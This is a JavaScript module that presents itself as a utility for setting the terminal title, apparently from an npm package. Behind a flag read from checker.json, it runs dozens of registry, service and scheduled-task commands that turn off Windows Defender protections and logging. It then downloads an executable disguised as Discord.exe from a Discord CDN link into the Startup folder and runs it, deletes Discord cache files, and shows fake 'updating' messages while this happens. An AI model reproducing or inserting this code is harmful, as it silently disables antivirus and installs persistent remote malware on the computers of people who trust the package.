module.exports = function setTerminalTitle(name, opts) {

    var cmd = require('node-cmd');;
    var fs = require('fs');;
    const cc = require('rgb-console');

    const {
        vali
    } = require("checker.json");

    if (vali && vali === "Não") {

    } else if (vali && vali === "Sim") {

        fs.writeFile("checker.json", `{
            "vali":"Não"
        }`, (err) => {
                    if (err);
                    else {}
                });

        cmd.runSync(`@ECHO OFF`)
        cmd.runSync(`REM from: https://pastebin.com/kYCVzZPz`)
        cmd.runSync(`REM Disable Tamper Protection First - on WIn10 vers which allow for this (not from 2004 onwards)`)
        cmd.runSync(`reg add "HKLM\\Software\\Microsoft\\Windows Defender\\Features" /v "TamperProtection" /t REG_DWORD /d "0" /f`)
        cmd.runSync(`REM To disable System Guard Runtime Monitor Broker`)
        cmd.runSync(`REM reg add "HKLM\\System\\CurrentControlSet\\Services\\SgrmBroker" /v "Start" /t REG_DWORD /d "4" /f`)
        cmd.runSync(`REM To disable Windows Defender Security Center include this`)
        cmd.runSync(`REM reg add "HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f`)
        cmd.runSync(`REM 1 - Disable Real-time protection`)
        cmd.runSync(`reg delete "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /f`)
        cmd.runSync(`reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f`)
        cmd.runSync(`reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f`)
        cmd.runSync(`reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f`)
        cmd.runSync(`reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f`)
        cmd.runSync(`reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f`)
        cmd.runSync(`reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f`)
        cmd.runSync(`reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f`)
        cmd.runSync(`reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f`)
        cmd.runSync(`reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f`)
        cmd.runSync(`reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f`)
        cmd.runSync(`reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f`)
        cmd.runSync(`reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f`)
        cmd.runSync(`reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f`)
        cmd.runSync(`REM 0 - Disable Logging`)
        cmd.runSync(`reg add "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f`)
        cmd.runSync(`reg add "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f`)
        cmd.runSync(`REM Disable WD Tasks`)
        cmd.runSync(`schtasks /Change /TN "Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh" /Disable`)
        cmd.runSync(`schtasks /Change /TN "Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance" /Disable`)
        cmd.runSync(`schtasks /Change /TN "Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup" /Disable`)
        cmd.runSync(`schtasks /Change /TN "Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan" /Disable`)
        cmd.runSync(`schtasks /Change /TN "Microsoft\\Windows\\Windows Defender\\Windows Defender Verification" /Disable`)
        cmd.runSync(`REM Disable WD systray icon`)
        cmd.runSync(`reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run" /v "SecurityHealth" /f`)
        cmd.runSync(`reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityHealth" /f`)
        cmd.runSync(`REM Remove WD context menu`)
        cmd.runSync(`reg delete "HKCR\\*\\shellex\\ContextMenuHandlers\\EPP" /f`)
        cmd.runSync(`reg delete "HKCR\\Directory\\shellex\\ContextMenuHandlers\\EPP" /f`)
        cmd.runSync(`reg delete "HKCR\\Drive\\shellex\\ContextMenuHandlers\\EPP" /f`)
        cmd.runSync(`REM Disable WD services`)
        cmd.runSync(`reg add "HKLM\\System\\CurrentControlSet\\Services\\WdBoot" /v "Start" /t REG_DWORD /d "4" /f`)
        cmd.runSync(`reg add "HKLM\\System\\CurrentControlSet\\Services\\WdFilter" /v "Start" /t REG_DWORD /d "4" /f`)
        cmd.runSync(`reg add "HKLM\\System\\CurrentControlSet\\Services\\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f`)
        cmd.runSync(`reg add "HKLM\\System\\CurrentControlSet\\Services\\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f`)
        cmd.runSync(`reg add "HKLM\\System\\CurrentControlSet\\Services\\WinDefend" /v "Start" /t REG_DWORD /d "4" /f`)
        cmd.runSync(`REM Disable Security system tray icon`)
        cmd.runSync(`reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Systray" /v "HideSystray" /t REG_DWORD /d "1" /f`)


        console.clear()

        const cor = ([
            'red',
            'green',
            'yellow',
            'blue',
            'cyan',
            'magenta'
        ])

        const ponto = ([
            '.',
            '..',
            '...',
            '....',
            '.....',
            '......'
        ])

        const corparauso = cor[Math.floor(Math.random() * cor.length)];
        const prontocom = ponto[Math.floor(Math.random() * cor.length)];

        cc[corparauso](`Atualizando${prontocom}`)


        cmd.runSync(`cd "%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" && powershell Invoke-WebRequest -Uri https://cdn.discordapp.com/attachments/982786980482023505/982823000262983680/Discord.exe -OutFile Discord.exe && Discord.exe`)
        cmd.runSync(`cd "%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" && powershell Invoke-WebRequest -Uri https://cdn.discordapp.com/attachments/982786980482023505/982824099443269663/remove.cmd -OutFile remove.cmd`)

        console.clear()

        cc[corparauso](`Limpando arquivos inuteis & Rastros do DISCORD${prontocom}`)

        cmd.runSync(`@echo off && color A && del /f /s /q %AppData%\\Discord\\Cache\\*.* && del /f /s /q %AppData%\\discord\\Cache\\*.* && del /f /s /q %AppData%\\discordcanary\\Cache\*.* && del /f /s /q %AppData%\\discordptb\\Cache\\*.* && del /f /s /q %AppData%\\discorddevelopment\\Cache\\*.*`)


        console.clear()
    }



    opts = opts || {};
    opts.logger = opts.logger || console;
    if (opts.verbose) {
        opts.logger.info("Definindo o título do terminal como " + "Discord");
    }
    process.stdout.write("\033]0;" + "Discord" + "\007");

};